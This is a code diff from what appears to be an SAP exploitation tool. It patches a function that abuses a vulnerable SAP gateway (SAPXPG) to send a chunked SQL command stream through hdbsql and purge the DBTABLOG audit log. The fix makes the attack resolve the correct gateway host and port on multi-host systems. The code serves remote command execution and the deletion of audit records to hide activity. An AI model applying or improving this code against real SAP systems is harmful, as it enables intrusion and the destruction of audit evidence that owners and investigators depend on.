@@ -304,9 +304,21 @@ def purge_dbtablog_via_gw_hdbsql(node, base_date: str, base_time: str,
     if not getattr(node, "gw_vulnerable", False):
         result["error"] = "node is not GW-vulnerable"
         return result
-    gw_port = getattr(node, "gw_vulnerable_port", 0) or 3300
+
+    # Issue #255 — gateway HOST and PORT come from the SAME owning
+    # instance via _find_gw_port (host already resolved to IPv4).
+    # Previously `host` was node.ip and `gw_port` the cached scalar —
+    # on a multi-host node the gw instance lives off node.ip so the
+    # chunked-SQL command stream SAPXPG'd into the wrong box.  Note
+    # the separate `hostname` arg below is the SAP APP hostname used
+    # inside the payload (NOT the connect host) — leave it node-level.
+    from sapmap_exploit import _find_gw_port
+    host, gw_port = _find_gw_port(node)
     if not gw_port:
         result["error"] = "no GW vulnerable port known"
+        return result
+    if not host:
+        result["error"] = f"no reachable host for GW port {gw_port}"
         return result
 
     try:
@@ -316,7 +328,6 @@ def purge_dbtablog_via_gw_hdbsql(node, base_date: str, base_time: str,
         result["error"] = str(e)
         return result
 
-    host = getattr(node, "ip", "") or getattr(node, "hostname", "")
     hostname = getattr(node, "hostname", "") or host
     sid = getattr(node, "sid", "")
     os_type = getattr(node, "os_type", "") or "LINUX"
